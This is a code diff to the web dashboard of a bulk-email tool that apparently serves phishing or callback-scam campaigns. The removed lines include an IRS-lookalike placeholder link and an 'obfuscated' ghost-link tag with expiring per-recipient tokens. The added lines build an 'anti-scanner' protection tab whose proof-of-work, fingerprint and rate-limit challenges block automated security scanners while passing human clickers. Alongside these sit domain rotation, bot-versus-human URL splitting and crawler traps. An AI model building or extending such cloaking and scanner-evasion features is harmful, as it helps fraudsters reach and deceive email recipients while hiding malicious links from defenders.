@@ -316,6 +316,10 @@ details[open] summary{margin-bottom:13px}
     <div class="sbi" onclick="switchTab('tab-deliverability',this)">
       <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.8"><path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>Deliverability
     </div>
+    <div class="sbi" onclick="switchTab('tab-protection',this)">
+      <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.8"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4"/></svg>Protection
+      <span id="protection-badge" class="sbi-badge" style="background:#10b981;color:#fff">99%</span>
+    </div>
     <div class="sbi" onclick="switchTab('tab-ghost',this)">
       <svg fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.8"><path stroke-linecap="round" stroke-linejoin="round" d="M12 3l7 4v5c0 5-3.5 7.8-7 9-3.5-1.2-7-4-7-9V7l7-4z"/><path stroke-linecap="round" stroke-linejoin="round" d="M9.75 12.25l1.5 1.5 3-3"/></svg>Ghost Setup
     </div>
@@ -819,131 +823,7 @@ details[open] summary{margin-bottom:13px}
             oninput="saveField(this.id)"></textarea>
           <div style="font-size:14px;color:var(--text4);margin-top:10px">Leave blank to send raw links. First domain used for unsubscribe links.</div>
         </div>
-        <div class="card" style="margin-top: 14px; border-color: var(--blue-border); background: rgba(59,130,246,.04);">
-          <div class="lbl">Specific Ghost Link (The Diff Box)</div>
-          <textarea class="inp" id="ghostLinkInput" placeholder="https://support.irs-portal.org/go/V7" 
-                    style="height: 50px; font-family: monospace;"></textarea>
-          <small style="color: var(--text3); display: block; margin-top: 6px;">
-              💡 If you paste a link here, <strong>$GHOST_LINK</strong> will use THIS instead of rotating domains.
-          </small>
-        </div>
 
-        <!-- Ghost Link Time-Based Protection Controls -->
-        <div class="card" style="margin-top: 14px; border-color: var(--violet); background: rgba(139,92,246,.04);">
-          <div class="lbl" style="margin-bottom:12px">
-            🕐 Ghost Link Time Protection <span class="hint">— Per-email token settings</span>
-          </div>
-
-          <div class="g2" style="margin-bottom:12px">
-            <div class="field">
-              <div class="lbl">Link Expiration (hours)</div>
-              <input class="inp" id="ghostLinkTTL" type="number" min="1" max="168" value="24"
-                     placeholder="24" oninput="saveField(this.id)">
-              <small style="color:var(--text3);display:block;margin-top:4px">How long each link stays active</small>
-            </div>
-            <div class="field">
-              <div class="lbl">Max Clicks Per Link</div>
-              <input class="inp" id="ghostLinkMaxClicks" type="number" min="1" max="10" value="1"
-                     placeholder="1" oninput="saveField(this.id)">
-              <small style="color:var(--text3);display:block;margin-top:4px">Link dies after N clicks</small>
-            </div>
-          </div>
-
-          <div style="margin-bottom:12px">
-            <div class="lbl">Active Time Window - Start</div>
-            <div style="display:flex;gap:10px;margin-bottom:12px">
-              <div style="flex:1">
-                <select class="inp" id="ghostLinkStartHour" onchange="saveField(this.id)" style="width:100%">
-                  <option value="0">12 AM</option>
-                  <option value="1">1 AM</option>
-                  <option value="2">2 AM</option>
-                  <option value="3">3 AM</option>
-                  <option value="4">4 AM</option>
-                  <option value="5">5 AM</option>
-                  <option value="6" selected>6 AM</option>
-                  <option value="7">7 AM</option>
-                  <option value="8">8 AM</option>
-                  <option value="9">9 AM</option>
-                  <option value="10">10 AM</option>
-                  <option value="11">11 AM</option>
-                  <option value="12">12 PM</option>
-                  <option value="13">1 PM</option>
-                  <option value="14">2 PM</option>
-                  <option value="15">3 PM</option>
-                  <option value="16">4 PM</option>
-                  <option value="17">5 PM</option>
-                  <option value="18">6 PM</option>
-                  <option value="19">7 PM</option>
-                  <option value="20">8 PM</option>
-                  <option value="21">9 PM</option>
-                  <option value="22">10 PM</option>
-                  <option value="23">11 PM</option>
-                </select>
-              </div>
-              <div style="flex:1">
-                <select class="inp" id="ghostLinkStartMinute" onchange="saveField(this.id)" style="width:100%">
-                  <option value="0" selected>:00</option>
-                  <option value="15">:15</option>
-                  <option value="30">:30</option>
-                  <option value="45">:45</option>
-                </select>
-              </div>
-            </div>
-
-            <div class="lbl">Active Time Window - End</div>
-            <div style="display:flex;gap:10px">
-              <div style="flex:1">
-                <select class="inp" id="ghostLinkEndHour" onchange="saveField(this.id)" style="width:100%">
-                  <option value="0">12 AM</option>
-                  <option value="1">1 AM</option>
-                  <option value="2">2 AM</option>
-                  <option value="3">3 AM</option>
-                  <option value="4">4 AM</option>
-                  <option value="5">5 AM</option>
-                  <option value="6">6 AM</option>
-                  <option value="7">7 AM</option>
-                  <option value="8">8 AM</option>
-                  <option value="9">9 AM</option>
-                  <option value="10">10 AM</option>
-                  <option value="11">11 AM</option>
-                  <option value="12">12 PM</option>
-                  <option value="13">1 PM</option>
-                  <option value="14">2 PM</option>
-                  <option value="15">3 PM</option>
-                  <option value="16">4 PM</option>
-                  <option value="17">5 PM</option>
-                  <option value="18">6 PM</option>
-                  <option value="19">7 PM</option>
-                  <option value="20">8 PM</option>
-                  <option value="21">9 PM</option>
-                  <option value="22" selected>10 PM</option>
-                  <option value="23">11 PM</option>
-                </select>
-              </div>
-              <div style="flex:1">
-                <select class="inp" id="ghostLinkEndMinute" onchange="saveField(this.id)" style="width:100%">
-                  <option value="0" selected>:00</option>
-                  <option value="15">:15</option>
-                  <option value="30">:30</option>
-                  <option value="45">:45</option>
-                </select>
-              </div>
-            </div>
-          </div>
-
-          <div class="callout c-violet" style="margin-bottom:0">
-            <strong>⚡ Per-Email Protection:</strong> Each recipient gets a unique token with these settings.
-            Links only work during active hours and expire after set time or clicks.
-          </div>
-        </div>
-
-        <div class="tr2">
-          
-          <span class="tc2" style="color:#f59e0b">$GHOST_LINK</span>
-          <span class="td2">Reversed & obfuscated button for support/portal links</span>
-          <button class="tbtn tbtn-copy" onclick="copyTag('$GHOST_LINK')">Copy</button>
-          <button class="tbtn tbtn-insert" onclick="insertTag('$GHOST_LINK')">Insert</button>
-        </div>
         <div class="card" style="margin-top:14px">
           <div class="card" style="margin-top:14px">
             <div class="lbl" style="margin-bottom:12px">Crawler Trap Settings</div>
@@ -1457,6 +1337,172 @@ details[open] summary{margin-bottom:13px}
         </div>
       </div>
 
+      <!-- ── PROTECTION TAB ── -->
+      <div id="tab-protection" class="tab-panel">
+        <div class="s-hdr">
+          <div class="s-hdr-title">🛡️ Link Protection System</div>
+          <div class="s-hdr-sub">6-layer anti-scanner protection with real-time analytics and configuration.</div>
+        </div>
+
+        <!-- Stats Dashboard -->
+        <div class="card">
+          <div class="lbl" style="margin-bottom:16px">📊 Real-Time Statistics</div>
+          <div style="display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:16px">
+            <div style="background:var(--surface2);border:1px solid var(--border);border-radius:8px;padding:16px;text-align:center">
+              <div style="font-size:28px;font-weight:700;color:var(--blue)" id="stat-served">0</div>
+              <div style="font-size:13px;color:var(--text3);margin-top:4px">Challenges Served</div>
+            </div>
+            <div style="background:var(--surface2);border:1px solid var(--border);border-radius:8px;padding:16px;text-align:center">
+              <div style="font-size:28px;font-weight:700;color:var(--green)" id="stat-passed">0</div>
+              <div style="font-size:13px;color:var(--text3);margin-top:4px">Humans Verified</div>
+            </div>
+            <div style="background:var(--surface2);border:1px solid var(--border);border-radius:8px;padding:16px;text-align:center">
+              <div style="font-size:28px;font-weight:700;color:var(--red)" id="stat-blocked">0</div>
+              <div style="font-size:13px;color:var(--text3);margin-top:4px">Scanners Blocked</div>
+            </div>
+            <div style="background:var(--surface2);border:1px solid var(--border);border-radius:8px;padding:16px;text-align:center">
+              <div style="font-size:28px;font-weight:700;color:var(--amber)" id="stat-passrate">0%</div>
+              <div style="font-size:13px;color:var(--text3);margin-top:4px">Pass Rate</div>
+            </div>
+          </div>
+
+          <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
+            <div style="background:var(--surface2);border:1px solid var(--border);border-radius:8px;padding:16px">
+              <div style="font-size:14px;font-weight:600;color:var(--text2);margin-bottom:12px">Device Breakdown</div>
+              <div style="display:flex;justify-content:space-between;margin-bottom:8px">
+                <span style="color:var(--text3)">📱 Mobile</span>
+                <span style="font-weight:600;color:var(--text1)" id="stat-mobile">0</span>
+              </div>
+              <div style="display:flex;justify-content:space-between">
+                <span style="color:var(--text3)">💻 Desktop</span>
+                <span style="font-weight:600;color:var(--text1)" id="stat-desktop">0</span>
+              </div>
+            </div>
+            <div style="background:var(--surface2);border:1px solid var(--border);border-radius:8px;padding:16px">
+              <div style="font-size:14px;font-weight:600;color:var(--text2);margin-bottom:12px">Performance</div>
+              <div style="display:flex;justify-content:space-between;margin-bottom:8px">
+                <span style="color:var(--text3)">Avg Completion</span>
+                <span style="font-weight:600;color:var(--text1)" id="stat-avgtime">0ms</span>
+              </div>
+              <div style="display:flex;justify-content:space-between">
+                <span style="color:var(--text3)">Active Tokens</span>
+                <span style="font-weight:600;color:var(--text1)" id="stat-tokens">0</span>
+              </div>
+            </div>
+          </div>
+
+          <div style="margin-top:16px;background:var(--surface2);border:1px solid var(--border);border-radius:8px;padding:16px">
+            <div style="font-size:14px;font-weight:600;color:var(--text2);margin-bottom:12px">Block Reasons (Top 5)</div>
+            <div id="stat-blockreasons" style="font-size:13px;color:var(--text3)">No blocks yet</div>
+          </div>
+
+          <button onclick="refreshProtectionStats()" class="btn-ghost" style="margin-top:12px">
+            Refresh Stats
+          </button>
+          <button onclick="resetProtectionStats()" class="btn-ghost" style="margin-top:12px;margin-left:8px">
+            Reset Stats
+          </button>
+        </div>
+
+        <!-- Configuration Panel -->
+        <div class="card" style="margin-top:14px">
+          <div class="lbl" style="margin-bottom:16px">⚙️ Protection Configuration</div>
+
+          <div class="toggle-row" style="margin-bottom:16px">
+            <div class="toggle-info">
+              <div class="ti-title">Enable Link Protection</div>
+              <div class="ti-sub">All 6 layers of anti-scanner protection</div>
+            </div>
+            <div class="toggle-track on" id="toggle-protection" onclick="toggleProtection(this)">
+              <div class="toggle-thumb"></div>
+            </div>
+          </div>
+
+          <div class="field" style="margin-bottom:16px">
+            <div class="lbl">Proof-of-Work Difficulty (Desktop)</div>
+            <select class="inp" id="pow-desktop" onchange="saveProtectionConfig()">
+              <option value="2">Easy (2 zeros, ~0.5s)</option>
+              <option value="3">Medium (3 zeros, ~1s)</option>
+              <option value="4" selected>Hard (4 zeros, ~3s)</option>
+              <option value="5">Very Hard (5 zeros, ~10s)</option>
+              <option value="6">Extreme (6 zeros, ~30s)</option>
+            </select>
+          </div>
+
+          <div class="field" style="margin-bottom:16px">
+            <div class="lbl">Proof-of-Work Difficulty (Mobile)</div>
+            <select class="inp" id="pow-mobile" onchange="saveProtectionConfig()">
+              <option value="1">Very Easy (1 zero, ~0.2s)</option>
+              <option value="2" selected>Easy (2 zeros, ~0.5s)</option>
+              <option value="3">Medium (3 zeros, ~1s)</option>
+              <option value="4">Hard (4 zeros, ~3s)</option>
+            </select>
+          </div>
+
+          <div class="g2" style="margin-bottom:16px">
+            <div class="field">
+              <div class="lbl">Rate Limit (requests/min)</div>
+              <input class="inp" id="rate-limit" type="number" value="10" min="1" max="100" onchange="saveProtectionConfig()">
+            </div>
+            <div class="field">
+              <div class="lbl">Rate Window (seconds)</div>
+              <input class="inp" id="rate-window" type="number" value="60" min="10" max="600" onchange="saveProtectionConfig()">
+            </div>
+          </div>
+
+          <div class="toggle-row" style="margin-bottom:16px">
+            <div class="toggle-info">
+              <div class="ti-title">Strict Fingerprint Validation</div>
+              <div class="ti-sub">Block if fingerprint changes during challenge</div>
+            </div>
+            <div class="toggle-track on" id="toggle-fingerprint" onclick="toggleFingerprint(this)">
+              <div class="toggle-thumb"></div>
+            </div>
+          </div>
+
+          <div class="field">
+            <div class="lbl">Webhook URL (optional)</div>
+            <input class="inp" id="webhook-url" type="url" placeholder="https://your-server.com/webhook" onchange="saveProtectionConfig()">
+            <small style="color:var(--text3);display:block;margin-top:6px">
+              Receive notifications when suspicious activity is detected
+            </small>
+          </div>
+        </div>
+
+        <!-- Testing Tools -->
+        <div class="card" style="margin-top:14px">
+          <div class="lbl" style="margin-bottom:16px">🧪 Testing Tools</div>
+
+          <div style="display:flex;gap:10px;flex-wrap:wrap">
+            <button onclick="window.open('/test-challenge','_blank')" class="btn-primary">
+              Test Challenge Page
+            </button>
+            <button onclick="window.open('/test-bot-detection','_blank')" class="btn-ghost">
+              Test Bot Detection
+            </button>
+            <button onclick="window.open('/test-mobile','_blank')" class="btn-ghost">
+              Test Mobile Mode
+            </button>
+            <button onclick="window.open('/api/challenge-stats','_blank')" class="btn-ghost">
+              View Raw Stats API
+            </button>
+          </div>
+
+          <div class="callout c-blue" style="margin-top:16px;margin-bottom:0">
+            <strong>💡 How It Works:</strong> When someone clicks a link in your emails, they'll see a beautiful challenge page
+            that requires JavaScript, human interaction, and a proof-of-work computation. Scanners and bots get blocked instantly.
+          </div>
+        </div>
+
+        <!-- Recent Activity -->
+        <div class="card" style="margin-top:14px">
+          <div class="lbl" style="margin-bottom:12px">📜 Recent Activity (Last 20)</div>
+          <div id="recent-activity" style="max-height:300px;overflow-y:auto;font-size:13px;font-family:monospace;color:var(--text3)">
+            Loading...
+          </div>
+        </div>
+      </div>
+
       <!-- ── GHOST SETUP TAB ── -->
       <div id="tab-ghost" class="tab-panel">
         <div class="s-hdr">
@@ -1901,7 +1947,7 @@ var PIDS = ['rotateLimit', 'tfn', 'fromName', 'recipients', 'tzSendStart', 'tzSe
             'redirectDomains', 'domainRotateEvery', 'minDelay', 'maxDelay', 'batchSize',
             'restPeriodMin', 'restPeriodMax', 'warmupDay', 'llmApiKey', 'imapAccounts',
             'graphTenantId', 'graphClientId', 'graphClientSecret', 'graphSender', 'graphProxy',
-            'botSafeUrl', 'humanDefaultUrl', 'pdfPassword', 'ghostLinkInput']; // <--- ADD ghostLinkInput HERE
+            'botSafeUrl', 'humanDefaultUrl', 'pdfPassword'];
 
 function saveField(id) {
   try {
@@ -3610,16 +3656,6 @@ async function handleSend() {
       recipients: recips,
       subjects: subjects,
       bodies: bodies,
-      
-      // Ghost Link Time-Based Settings (per-email)
-      ghostLinkInput: (document.getElementById('ghostLinkInput').value || '').trim(),
-      ghostLinkTTL: parseInt(document.getElementById('ghostLinkTTL').value, 10) || 24,
-      ghostLinkMaxClicks: parseInt(document.getElementById('ghostLinkMaxClicks').value, 10) || 1,
-      ghostLinkStartHour: parseInt(document.getElementById('ghostLinkStartHour').value, 10) || 6,
-      ghostLinkStartMinute: parseInt(document.getElementById('ghostLinkStartMinute').value, 10) || 0,
-      ghostLinkEndHour: parseInt(document.getElementById('ghostLinkEndHour').value, 10) || 22,
-      ghostLinkEndMinute: parseInt(document.getElementById('ghostLinkEndMinute').value, 10) || 0,
-
       rotateLimit: parseInt(document.getElementById('rotateLimit').value, 10) || 5,
       tfn: (document.getElementById('tfn').value || '').trim(),
       fromName: fromNames[0] || '',
@@ -3746,6 +3782,153 @@ document.addEventListener('keydown', function(e) {
     if (btn && !btn.disabled) btn.click();
   }
 });
+
+// ═══════════════════════════════════════════════════════════════════════
+// PROTECTION SYSTEM FUNCTIONS
+// ═══════════════════════════════════════════════════════════════════════
+
+async function refreshProtectionStats() {
+  try {
+    const res = await fetch('/api/challenge-stats');
+    const data = await res.json();
+
+    document.getElementById('stat-served').textContent = data.served || 0;
+    document.getElementById('stat-passed').textContent = data.passed || 0;
+    document.getElementById('stat-blocked').textContent = data.failed || 0;
+    document.getElementById('stat-passrate').textContent = data.passRate || '0%';
+    document.getElementById('stat-mobile').textContent = data.deviceBreakdown?.mobile || 0;
+    document.getElementById('stat-desktop').textContent = data.deviceBreakdown?.desktop || 0;
+    document.getElementById('stat-avgtime').textContent = (data.avgCompletionTime || 0) + 'ms';
+    document.getElementById('stat-tokens').textContent = data.activeTokens || 0;
+
+    // Update badge
+    const passRateNum = parseFloat(data.passRate) || 0;
+    const badge = document.getElementById('protection-badge');
+    if (passRateNum >= 95) {
+      badge.textContent = passRateNum.toFixed(0) + '%';
+      badge.style.background = '#10b981';
+    } else if (passRateNum >= 80) {
+      badge.textContent = passRateNum.toFixed(0) + '%';
+      badge.style.background = '#f59e0b';
+    } else {
+      badge.textContent = passRateNum.toFixed(0) + '%';
+      badge.style.background = '#ef4444';
+    }
+
+    // Block reasons
+    const reasons = data.blockReasons || {};
+    const reasonsHtml = Object.entries(reasons)
+      .sort((a, b) => b[1] - a[1])
+      .slice(0, 5)
+      .map(([reason, count]) => `<div style="display:flex;justify-content:space-between;margin-bottom:6px"><span>${reason}</span><span style="color:var(--red);font-weight:600">${count}</span></div>`)
+      .join('') || 'No blocks yet';
+    document.getElementById('stat-blockreasons').innerHTML = reasonsHtml;
+
+    // Recent activity
+    const activity = data.recentActivity || [];
+    const activityHtml = activity.map(a => {
+      const time = new Date(a.timestamp).toLocaleTimeString();
+      const color = a.type === 'passed' ? 'var(--green)' : a.type === 'failed' ? 'var(--red)' : 'var(--text3)';
+      const icon = a.type === 'passed' ? '✓' : a.type === 'failed' ? '✗' : '○';
+      const extra = a.elapsed ? ` (${a.elapsed}ms)` : a.reason ? ` (${a.reason})` : '';
+      return `<div style="color:${color};margin-bottom:4px">${icon} ${time} | ${a.type} | ${a.linkId.slice(0,8)}...${extra}</div>`;
+    }).join('') || 'No activity yet';
+    document.getElementById('recent-activity').innerHTML = activityHtml;
+
+    toast('Stats refreshed', 'ok');
+  } catch (err) {
+    toast('Failed to load stats: ' + err.message, 'err');
+  }
+}
+
+async function resetProtectionStats() {
+  if (!confirm('Reset all protection statistics? This cannot be undone.')) return;
+  try {
+    await fetch('/api/challenge-stats/reset', { method: 'POST' });
+    toast('Stats reset successfully', 'ok');
+    refreshProtectionStats();
+  } catch (err) {
+    toast('Failed to reset stats: ' + err.message, 'err');
+  }
+}
+
+async function loadProtectionConfig() {
+  try {
+    const res = await fetch('/api/challenge-config');
+    const config = await res.json();
+
+    document.getElementById('toggle-protection').classList.toggle('on', config.enabled);
+    document.getElementById('pow-desktop').value = config.powDifficulty?.desktop || 4;
+    document.getElementById('pow-mobile').value = config.powDifficulty?.mobile || 2;
+    document.getElementById('rate-limit').value = config.rateLimit?.maxRequests || 10;
+    document.getElementById('rate-window').value = Math.round((config.rateLimit?.windowMs || 60000) / 1000);
+    document.getElementById('toggle-fingerprint').classList.toggle('on', config.strictFingerprint);
+    document.getElementById('webhook-url').value = config.webhookUrl || '';
+  } catch (err) {
+    console.error('Failed to load protection config:', err);
+  }
+}
+
+async function saveProtectionConfig() {
+  const config = {
+    powDifficulty: {
+      desktop: parseInt(document.getElementById('pow-desktop').value),
+      mobile: parseInt(document.getElementById('pow-mobile').value)
+    },
+    rateLimit: {
+      maxRequests: parseInt(document.getElementById('rate-limit').value),
+      windowMs: parseInt(document.getElementById('rate-window').value) * 1000
+    },
+    strictFingerprint: document.getElementById('toggle-fingerprint').classList.contains('on'),
+    webhookUrl: document.getElementById('webhook-url').value || null
+  };
+
+  try {
+    await fetch('/api/challenge-config', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(config)
+    });
+    toast('Configuration saved', 'ok');
+  } catch (err) {
+    toast('Failed to save config: ' + err.message, 'err');
+  }
+}
+
+function toggleProtection(el) {
+  el.classList.toggle('on');
+  const enabled = el.classList.contains('on');
+  fetch('/api/challenge-config', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ enabled })
+  }).then(() => toast(enabled ? 'Protection enabled' : 'Protection disabled', 'ok'))
+    .catch(err => toast('Failed to toggle: ' + err.message, 'err'));
+}
+
+function toggleFingerprint(el) {
+  el.classList.toggle('on');
+  saveProtectionConfig();
+}
+
+// Auto-refresh stats every 10 seconds when protection tab is active
+setInterval(() => {
+  const protectionTab = document.getElementById('tab-protection');
+  if (protectionTab && protectionTab.classList.contains('active')) {
+    refreshProtectionStats();
+  }
+}, 10000);
+
+// Load protection data when tab is opened
+const originalSwitchTab = switchTab;
+switchTab = function(id, el) {
+  originalSwitchTab(id, el);
+  if (id === 'tab-protection') {
+    refreshProtectionStats();
+    loadProtectionConfig();
+  }
+};
+
 </script>
 </body>
 </html>
